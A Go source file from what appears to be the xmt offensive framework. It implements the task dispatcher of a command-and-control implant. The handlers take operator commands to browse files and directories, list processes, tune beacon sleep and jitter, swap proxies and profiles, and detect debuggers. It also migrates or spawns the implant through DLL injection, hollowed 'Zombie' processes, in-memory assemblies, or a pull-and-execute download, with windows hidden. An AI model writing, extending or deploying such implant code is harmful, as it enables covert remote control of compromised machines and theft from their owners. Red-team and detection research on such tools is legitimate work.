package c2

import (
	"context"
	"io"
	"io/fs"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const fourOhFour = "0x404"

var (
	_ runnable = (*cmd.DLL)(nil)
	_ runnable = (*cmd.Zombie)(nil)
	_ runnable = (*cmd.Process)(nil)
	_ runnable = (*cmd.Assembly)(nil)
)

func wrapScript(s *Session, n *com.Packet) {
	var (
		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		err = runScript(s, n, r)
	)
	if n.Clear(); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/MuX/ScR] Error during Job %d runtime: %s!", s.ID, n.Job, err)
		}
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	}
	if err = s.write(false, r); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/Mux/ScR] Received error sending Task results: %s!", s.ID, err)
		}
	}
}
func runScript(s *Session, n, w *com.Packet) error {
	e, err := n.Bool()
	if err != nil {
		return err
	}
	var o bool
	if err = n.ReadBool(&o); err != nil {
		return err
	}
	var (
		b = buffers.Get().(*data.Chunk)
		d []byte
		k bool
		v com.Packet
	)
	for err = nil; err == nil; b.Reset() {
		v.Reset()
		if err = n.ReadUint8(&v.ID); err != nil {
			break
		}
		if err = n.ReadBytes(&d); err != nil && err != io.EOF {
			break
		}
		v.Grow(len(d))
		v.Write(d)
		d, err = nil, nil
		w.WriteUint8(v.ID)
		if k, err = internalTask(s, &v, b); !k {
			t := task.Mappings[v.ID]
			if t == nil {
				if cout.Enabled {
					s.log.Warning("[%s/MuX/ScR] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
				}
				if e {
					// Set this so we set an error and return something.
					err = os.ErrNotExist
					break
				}
				w.WriteBool(false)
				w.WriteString(fourOhFour)
				continue
			}
			err = t(s.ctx, &v, b)
		}
		if err != nil {
			if e {
				break
			}
			w.WriteBool(false)
			w.WriteString(err.Error())
			continue
		}
		if w.WriteBool(true); o && b.Size() > 0 {
			w.WriteBytes(b.Payload())
		} else {
			w.WriteUint8(0)
		}
	}
	b.Clear()
	v.Clear()
	n.Clear()
	if buffers.Put(b); err == io.EOF {
		return nil
	}
	return err
}
func defaultClientMux(s *Session, n *com.Packet) bool {
	if n.ID < task.MvRefresh {
		return false
	}
	if cout.Enabled {
		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
	}
	if n.ID == task.MvScript {
		go wrapScript(s, n)
		return true
	}
	if n.ID < RvResult {
		if n.ID == task.MvSpawn {
			go executeTask(s.handleSpawn, s, n)
			return true
		}
		var (
			r      = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
			v, err = internalTask(s, n, r)
		)
		if v {
			if n.Clear(); err == nil && n.ID == task.MvMigrate {
				if cout.Enabled {
					s.log.Info("[%s/Mux] Migrate Job %d returned true, not sending response back!", s.ID, n.Job)
				}
				return true
			}
			if err != nil {
				if r.Clear(); cout.Enabled {
					s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, err)
				}
				r.Flags |= com.FlagError
				r.WriteString(err.Error())
			} else if cout.Enabled {
				s.log.Debug("[%s/MuX] Task with JobID %d completed!", s.ID, n.Job)
			}
			// NOTE(dij): We block here since most of these are critical.
			s.write(true, r)
			return true
		}
		r.Clear()
		r = nil
	}
	if n.ID == task.TvWait {
		if cout.Enabled {
			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
		}
		s.write(true, &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID})
		return true
	}
	if t := task.Mappings[n.ID]; t != nil {
		go executeTask(t, s, n)
		return true
	}
	if cout.Enabled {
		s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
	}
	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
	r.WriteString(fourOhFour)
	s.write(true, r)
	return false
}
func executeTask(t task.Tasker, s *Session, n *com.Packet) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.executeTask()")
	}
	if cout.Enabled {
		s.log.Info("[%s/TasK] Starting Task with JobID %d.", s.ID, n.Job)
	}
	var (
		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		err = t(s.ctx, n, r)
	)
	if n.Clear(); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/TasK] Received error during JobID %d Task runtime: %s!", s.ID, n.Job, err)
		}
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	} else if cout.Enabled {
		s.log.Debug("[%s/TasK] Task with JobID %d completed!", s.ID, n.Job)
	}
	if err = s.write(false, r); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/TasK] Received error sending Task results: %s!", s.ID, err)
		}
	}
}
func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
	switch n.ID {
	case task.MvPwd:
		d, err := syscall.Getwd()
		if err != nil {
			return true, err
		}
		w.WriteString(d)
		return true, nil
	case task.MvCwd:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		return true, syscall.Chdir(device.Expand(d))
	case task.MvList:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		if len(d) == 0 {
			d = "."
		} else {
			d = device.Expand(d)
		}
		s, err := os.Stat(d)
		if err != nil {
			return true, err
		}
		if !s.IsDir() {
			w.WriteUint32(1)
			w.WriteString(s.Name())
			w.WriteInt32(int32(s.Mode()))
			w.WriteInt64(s.Size())
			w.WriteInt64(s.ModTime().Unix())
			return true, nil
		}
		var l []fs.DirEntry
		if l, err = os.ReadDir(d); err != nil {
			return true, err
		}
		w.WriteUint32(uint32(len(l)))
		for i, m := uint32(0), uint32(len(l)); i < m; i++ {
			w.WriteString(l[i].Name())
			if x, err := l[i].Info(); err == nil {
				w.WriteInt32(int32(x.Mode()))
				w.WriteInt64(x.Size())
				w.WriteInt64(x.ModTime().Unix())
				continue
			}
			w.WriteInt32(0)
			w.WriteInt64(0)
			w.WriteInt64(0)
		}
		return true, nil
	case task.MvTime:
		j, err := n.Int8()
		if err != nil {
			return true, err
		}
		d, err := n.Int64()
		if err != nil {
			return true, err
		}
		switch {
		case j == -1:
			// NOTE(dij): This handles a special case where Script packets are
			//            used to set the sleep/jitter since they don't have access
			//            to the previous values.
			//            A packet with a '-1' Jitter value will be ignored.
		case j > 100:
			s.jitter = 100
		case j < 0:
			s.jitter = 0
		default:
			s.jitter = uint8(j)
		}
		if d > 0 {
			// NOTE(dij): Ditto here, except for sleep. Anything less than zero
			//            will work.
			s.sleep = time.Duration(d)
		}
		return true, nil
	case task.MvProxy:
		var (
			v string
			r uint8
		)
		if err := n.ReadString(&v); err != nil {
			return true, err
		}
		if err := n.ReadUint8(&r); err != nil {
			return true, err
		}
		if r == 0 {
			if i := s.Proxy(v); i != nil {
				return true, i.Close()
			}
			return true, os.ErrNotExist
		}
		if ProfileParser == nil {
			return true, xerr.Sub("no Profile parser loaded", 0x15)
		}
		var (
			b string
			k []byte
		)
		if err := n.ReadString(&b); err != nil {
			return true, err
		}
		if err := n.ReadBytes(&k); err != nil {
			return true, err
		}
		p, err := ProfileParser(k)
		if err != nil {
			return true, xerr.Wrap("parse Profile", err)
		}
		if r == 1 {
			i := s.Proxy(v)
			if i == nil {
				return true, os.ErrNotExist
			}
			return true, i.Replace(b, p)
		}
		_, err = s.NewProxy(v, b, p)
		return true, err
	case task.MvMounts:
		m, err := device.Mounts()
		if err != nil {
			return true, err
		}
		data.WriteStringList(w, m)
		return true, nil
	case task.MvMigrate:
		var (
			k bool
			i string
			p []byte
		)
		if err := n.ReadBool(&k); err != nil {
			return true, err
		}
		if err := n.ReadString(&i); err != nil {
			return true, err
		}
		if err := n.ReadBytes(&p); err != nil {
			return true, err
		}
		e, v, err := readCallable(s.ctx, n)
		if err != nil {
			return true, err
		}
		if _, err = s.MigrateProfile(k, i, p, n.Job, 0, e); err != nil {
			if len(v) > 0 {
				os.Remove(v)
			}
			return true, err
		}
		return true, nil
	case task.MvRefresh:
		if cout.Enabled {
			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
		}
		if err := local.Device.Refresh(); err != nil {
			return true, err
		}
		s.Device = *local.Device.Machine
		s.Device.MarshalStream(w)
		return true, nil
	case task.MvProfile:
		if ProfileParser == nil {
			return true, xerr.Sub("no Profile parser loaded", 0x15)
		}
		b, err := n.Bytes()
		if err != nil {
			return true, err
		}
		p, err := ProfileParser(b)
		if err != nil {
			return true, xerr.Wrap("parse Profile", err)
		}
		if cout.Enabled {
			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
		}
		s.swap = p
		return true, nil
	case task.MvProcList:
		e, err := cmd.Processes()
		if err != nil {
			return true, err
		}
		if err = w.WriteUint32(uint32(len(e))); err != nil {
			return true, err
		}
		if len(e) == 0 {
			return true, nil
		}
		for i, m := uint32(0), uint32(len(e)); i < m; i++ {
			if err = e[i].MarshalStream(w); err != nil {
				return true, err
			}
		}
		return true, nil
	case task.MvCheckDebug:
		w.WriteBool(device.IsDebugged())
		return true, nil
	}
	return false, nil
}
func readCallable(x context.Context, r data.Reader) (cmd.Runnable, string, error) {
	var (
		f   *filter.Filter
		err = filter.UnmarshalStream(r, &f)
	)
	if err != nil {
		return nil, "", err
	}
	var (
		e cmd.Runnable
		j bool
		v string
		t uint8
	)
	if err = r.ReadUint8(&t); err != nil {
		return nil, "", err
	}
	// NOTE(dij): We're using the Background context here as we don't want
	//            cancelation for this process as we're creating it to
	//            succeed us (or be independent).
	switch t {
	case task.TvDLL:
		var d *cmd.DLL
		if d, _, j, err = task.DLLUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		if d.Timeout = 0; j {
			v = d.Path
		}
		e = d
	case task.TvZombie:
		var z *cmd.Zombie
		if z, _, err = task.ZombieUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		z.Timeout = 0
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		z.SetNoWindow(true)
		z.SetWindowDisplay(0)
		e = z
	case task.TvExecute:
		var p *cmd.Process
		if p, _, err = task.ProcessUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		p.Timeout = 0
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		p.SetNoWindow(true)
		p.SetWindowDisplay(0)
		e = p
	case task.TvAssembly:
		var a *cmd.Assembly
		if a, _, err = task.AssemblyUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		a.Timeout = 0
		e = a
	case task.TvPullExecute:
		var u, q string
		if err = r.ReadString(&u); err != nil {
			return nil, "", err
		}
		if err = r.ReadString(&q); err != nil {
			return nil, "", err
		}
		// NOTE(dij): We HAVE to set the Context as the parent to avoid
		//            io locking issues. *shrug* Luckily, the 'Release' function
		//            does it job!
		if e, v, err = task.WebResource(x, nil, false, q, u); err != nil {
			return nil, "", err
		}
	default:
		if v, err = os.Executable(); err != nil {
			return nil, "", err
		}
		c := cmd.NewProcessContext(context.Background(), v)
		c.SetNoWindow(true)
		c.SetWindowDisplay(0)
		e = c
	}
	if e.SetParent(f); !j {
		v = ""
	}
	return e, v, nil
}
func (s *Session) handleSpawn(x context.Context, r data.Reader, w data.Writer) error {
	var (
		i string
		p []byte
	)
	if err := r.ReadString(&i); err != nil {
		return err
	}
	if err := r.ReadBytes(&p); err != nil {
		return err
	}
	e, v, err := readCallable(s.ctx, r)
	if err != nil {
		return err
	}
	var c uint32
	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
		if len(v) > 0 {
			os.Remove(v)
		}
		return err
	}
	w.WriteUint32(c)
	return nil
}
